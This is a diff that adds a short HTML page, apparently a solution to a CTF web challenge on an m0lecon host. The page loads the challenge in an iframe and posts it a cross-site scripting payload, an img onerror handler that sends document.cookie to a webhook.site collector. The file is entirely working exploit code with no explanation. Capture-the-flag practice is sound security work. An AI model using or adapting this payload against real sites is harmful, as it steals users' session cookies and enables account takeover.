@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe id="f" src="https://1cd721bf-deb5-42a1-a0ae-b5fb030b433b.offsec.m0lecon.it/preview"></iframe>
+<script>
+  document.getElementById('f').addEventListener('load', () => {
+    document.getElementById('f').contentWindow.postMessage({
+      html: `<img src=x onerror="fetch('https://webhook.site/c4a58974-07cb-4a16-82b3-94c42e4566af/?c='+document.cookie)">`
+    }, '*');
+  });
+</script>
+</body>
+</html>
